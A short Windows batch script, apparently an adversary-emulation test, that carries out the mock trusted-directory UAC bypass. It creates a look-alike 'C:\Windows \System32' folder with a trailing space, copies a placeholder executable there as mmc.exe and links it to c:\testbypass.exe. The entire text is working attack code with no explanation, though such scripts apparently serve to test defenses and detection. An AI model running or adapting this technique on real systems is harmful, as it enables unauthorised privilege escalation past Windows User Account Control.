@echo off
mkdir "\\?\C:\Windows \System32\"
copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"